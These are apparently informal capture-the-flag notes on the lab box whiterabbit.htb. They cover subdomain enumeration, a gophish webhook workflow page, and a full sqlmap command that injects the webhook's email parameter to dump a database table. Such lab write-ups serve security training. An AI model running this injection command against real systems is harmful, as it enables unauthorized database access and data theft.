

we manage to find some subdomains 
	status.whitrabbit.htb then just bruteforcing directories for interesting files 

--> first in http://status.whiterbbit.htb/status/temp/ we trigger to have some new domains

	here are all we found 

		ddb09a8558c9.whiterabbit.htb	

		a668910b5514e.whiterabbit.htb	

		28efa8f7df.whiterabbit.htb

		
	so the few we got , we take the last one for pentesting it 
			we came onto a todo list website ; 
		
		then trying to see all to do , we see http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
		we saw this lines 

				Database Interactions

		    User Validation: Checks if the user’s email from the event is present in the database.

		    Phishing Score Update: Depending on the user’s action, their phishing susceptibility score is updated. Actions like clicking a phishing link or submitting data through a phishing form negatively impact their score.

		    Debugging and Error Handling: Notably, there is a debug node labeled "DEBUG: REMOVE SOON" that aids in troubleshooting by providing error messages when things go awry. This node is temporary and will be removed once the workflow is fully operational and stable.

		    Conditional Logic: The workflow includes conditions to handle different scenarios, such as actions taken by the user (e.g., clicking a link or submitting data), and adjusts the phishing score accordingly.

Understand the trully purpose of that , we're figure out that the target should be vulnerable to  sqli 
		So using sqlmap , this is the full command , i ommitted the steps to retrieve database and table we interest on

		# Sqli testing

		sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --method POST --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Linka"}' -p email --proxy http://127.0.0.1:8080/ --batch --dump --level=5 --risk=3 -D temp -T command_log --flush


		# Note  that  it could take a bit longer but hopefully we do it right , alternatively , i redirect the traffic to my burp instance crawler this is why you see --proxy tag 
